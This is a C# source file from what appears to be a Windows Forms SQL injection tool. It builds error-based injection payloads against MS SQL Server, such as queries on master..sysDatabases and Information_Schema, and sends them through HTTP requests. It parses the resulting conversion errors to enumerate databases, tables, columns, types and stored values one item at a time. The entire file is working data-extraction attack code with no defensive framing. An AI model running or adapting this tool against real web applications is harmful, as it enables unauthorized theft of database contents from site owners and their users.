using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;

namespace SqlInjection_DatabaseExplorer
{
    public class getData
    {
        public static void populateListBoxWithPayloadData(ListBox lbToPopulate, string strPayload_Before, string strPayload_After, string strLastItem, string strThrowAnConvertError, ref bool bCancelRequest)
        {
            //string strLastItem = "";
            bCancelRequest = false;
            while (!bCancelRequest)
            {
                string strPayload = strPayload_Before +
                    strLastItem +
                    strPayload_After;
                debugInfo.addDebugMessageOnTop("Payload:" + strPayload);
                string strErrorMessage = httpRequests.executerequestAndGetNormalizedPayloadErrorMessage(strPayload);
                if (strErrorMessage.IndexOf("Syntax error") == -1 &&
                    strErrorMessage.IndexOf("Object reference") == -1 &&
                    strErrorMessage.IndexOf("The conversion") == -1 &&
                    strErrorMessage.IndexOf("Conversion failed when") == -1
                    )
                {
                    debugInfo.addDebugMessageOnTop(strErrorMessage);
                    break;
                }
                strLastItem = stringFilters.extractString(strErrorMessage, "'", "'");
                if (strLastItem != "")
                {
                    if ("" != strThrowAnConvertError)
                        strLastItem = strLastItem.Replace(strThrowAnConvertError, "");
                    lbToPopulate.Items.Add(strLastItem);
                }
                else
                    break;
            }
        }

        public static void getAvailableDatabases(ListBox lbDbSchema_AvailableDatabases, ListBox lbDbSchema_AvailableTables, ListView lvDbSchema_AvailableColumns, ListBox lbDbSchema_ColumnData, ref bool bCancelRequest)
        {
            debugInfo.addDebugMessageOnTop("Get Databases from localserver 'http://127.0.0.1'");
            lbDbSchema_AvailableDatabases.Items.Clear();
            lbDbSchema_AvailableTables.Items.Clear();
            lvDbSchema_AvailableColumns.Items.Clear();
            lbDbSchema_ColumnData.Items.Clear();
            string strPayload_Before = "' and 1 in (select top 1 min(name) from master..sysDatabases where name > '";
            string strPayload_After = "' group by name order by name ASC) --";
            getData.populateListBoxWithPayloadData(lbDbSchema_AvailableDatabases, strPayload_Before, strPayload_After, "", "", ref bCancelRequest);

        }

        public static void GetDatabaseTables(string strDatabaseName, ListBox lbDbSchema_AvailableDatabases, ListBox lbDbSchema_AvailableTables, ListView lvDbSchema_AvailableColumns, ListBox lbDbSchema_ColumnData, ref bool bCancelRequest)  
        {
            debugInfo.addDebugMessageOnTop("Getting Tables from Database '" + strDatabaseName + "'");
            lbDbSchema_AvailableDatabases.Enabled = false;
//            lbDbSchema_TablesInDatabase.Text = strDatabaseName;
            lbDbSchema_AvailableTables.Items.Clear();
            lvDbSchema_AvailableColumns.Items.Clear();
            lbDbSchema_ColumnData.Items.Clear();
            string strPayload_Before = "' and 1 in (select top 1 min(Table_Name) from " + strDatabaseName + ".Information_Schema.Tables where Table_Name > '";
            string strPayload_After = "' group by Table_Name order by Table_Name ASC) --";
            getData.populateListBoxWithPayloadData(lbDbSchema_AvailableTables, strPayload_Before, strPayload_After, "", "", ref bCancelRequest);
            lbDbSchema_AvailableDatabases.Enabled = true;

        }

        public static void GetTableColumns(string strDatabaseName, string strTableName , ListBox lbDbSchema_AvailableDatabases, ListBox lbDbSchema_AvailableTables, ListView lvDbSchema_AvailableColumns, ListBox lbDbSchema_ColumnData, ref bool bCancelRequest)
        {
            debugInfo.addDebugMessageOnTop("Getting Columns from Table '" + strDatabaseName + "." + strTableName + "'");
            lbDbSchema_AvailableTables.Enabled = false;
//            lbDbSchema_ColumnsInTable.Text = strTableName;
            lvDbSchema_AvailableColumns.Items.Clear();
            lbDbSchema_ColumnData.Items.Clear();

            string strTableUniqueId = getData.getTableUniqueId(strDatabaseName, strTableName);

            string strColumnNamePayload_Before = "' and 1 in (select top 1 min(Column_Name) from " + strDatabaseName + ".Information_Schema.Columns where ((Column_Name > '";
            string strColumnNamePayload_After = "') and (table_name='" + strTableName + "')) group by Column_Name order by Column_Name ASC) --";

            string strLastItem = "";
            bCancelRequest = false;
            while (!bCancelRequest)
            {
                string strColumnNamePayload = strColumnNamePayload_Before +
                                              strLastItem +
                                              strColumnNamePayload_After;
                debugInfo.addDebugMessageOnTop("Payload: " + strColumnNamePayload);

                string strErrorMessage = httpRequests.executerequestAndGetNormalizedPayloadErrorMessage(strColumnNamePayload);
                if (strErrorMessage.IndexOf("Syntax error") == -1 && 
                    strErrorMessage.IndexOf("Object reference") == -1 &&
                    strErrorMessage.IndexOf("Conversion failed when") == -1
                    )
                {
                    debugInfo.addDebugMessageOnTop(strErrorMessage);
                    break;
                }
                strLastItem = stringFilters.extractString(strErrorMessage, "'", "'");
                if (strLastItem != "")
                {
                    string strDataType = getData.getColumnDataType(strDatabaseName, strTableName, strLastItem);
                    string strIsColumnIdentity = getData.isColumnIdentity(strDatabaseName, strTableUniqueId, strLastItem);
                    lvDbSchema_AvailableColumns.Items.Add(new ListViewItem(new string[3] { strLastItem, strDataType, strIsColumnIdentity }));
                    Application.DoEvents();
                }
                else
                    break;
            }

            lbDbSchema_AvailableTables.Enabled = true;
        }



        public static void GetColumnData(string strDatabaseName, string strTableName, string strColumnName, string strColumnDataType, ListBox lbDbSchema_ColumnData, ref bool bCancelRequest)
        {
            string strPayload_After = "";
            string strPayload_Before = "";
            lbDbSchema_ColumnData.Text = strColumnName;
            lbDbSchema_ColumnData.Items.Clear();
            switch (strColumnDataType)
            {
                case "varchar":
                    {
                        getPayload.beforeAfterMode_Value_varChar(strDatabaseName, strTableName, strColumnName, ref strPayload_Before, ref strPayload_After);
                        populateListBoxWithPayloadData(lbDbSchema_ColumnData, strPayload_Before, strPayload_After, "", "",ref bCancelRequest);
                        break;
                    }
                case "numeric":
                    {
                        getPayload.beforeAfterMode_Value_numeric(strDatabaseName, strTableName, strColumnName, ref strPayload_Before, ref strPayload_After);
                        populateListBoxWithPayloadData(lbDbSchema_ColumnData, strPayload_Before, strPayload_After, "0", getPayload.strThrowAnConvertError, ref bCancelRequest);
                        break;
                    }
                default:
                    {
                        debugInfo.addDebugMessageOnTop("Error: Data_Type " + strColumnDataType + " not support (currently on varchar is supported");
                        break;
                    }

            }
        }

        public static string getColumnDataType(string strDatabaseName, string strTableName, string strColumnName)
        {
            string strColumnDataTypePayload = getPayload.getColumnDataType(strDatabaseName, strTableName, strColumnName);
            string strDataType = stringFilters.extractString(httpRequests.executerequestAndGetNormalizedPayloadErrorMessage(strColumnDataTypePayload), "'", "'");
            return strDataType;
        }

        public static string getTableUniqueId(string strDatabaseName, string strTableName)
        {
            string strTableUniqueIdPayload = getPayload.getTableUniqueId(strDatabaseName, strTableName);
            string strTableUniqueId = stringFilters.extractString(httpRequests.executerequestAndGetNormalizedPayloadErrorMessage(strTableUniqueIdPayload), "'", "'");
            return strTableUniqueId.Replace(getPayload.strThrowAnConvertError, "");
        }


        public static string isColumnIdentity(string strDatabaseName, string strTableUniqueId, string strColumnName)
        {
            string strCustomWhere = "((name='" + strColumnName + "') and (id=" + strTableUniqueId + "))";
            string strPayload = getPayload.value_numeric_withCustomWhere(strDatabaseName, "syscolumns", "colstat", strCustomWhere);
            //			Console.WriteLine(strPayload);
            //			Console.WriteLine(strPayload.Replace(getPayload.strCustomExploitTag_after,"").Replace(getPayload.strCustomExploitTag_before,""));
            string strIsIdentiry = stringFilters.extractString(httpRequests.executerequestAndGetNormalizedPayloadErrorMessage(strPayload), "'", "'");
            strIsIdentiry = strIsIdentiry.Replace(getPayload.strThrowAnConvertError, "");
            //			Console.WriteLine(strIsIdentiry.Replace(getPayload.strThrowAnConvertError,""));
            if (strIsIdentiry == "0")
                return "No";
            else
                return "Yes";
        }
    }
}
